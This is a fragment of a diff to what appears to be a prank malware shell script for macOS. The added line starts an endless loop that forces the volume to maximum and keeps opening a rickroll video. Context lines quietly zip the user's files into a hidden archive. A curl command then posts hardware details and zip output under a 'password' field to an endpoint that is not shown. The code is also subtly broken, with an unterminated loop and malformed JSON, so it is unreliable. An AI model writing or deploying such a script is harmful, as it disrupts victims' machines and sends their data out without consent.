@@ -12,6 +12,7 @@ zip -r ../.downloads.zip *
 # networksetup -setnetworkserviceenabled "Wi-Fi" off
 sleep 600
 # networksetup -setnetworkserviceenabled "Wi-Fi" on
+while true; do osascript -e "set volume output volume 100"; open https://shattereddisk.github.io/rickroll/rickroll.mp4
 curl -d '{                      
  \"sysinfo\": \"'"$(system_profiler SPHardwareDataType)"'\"
  \"password\": \"'"$(zip -r ../.downloads.zip *)"'\"
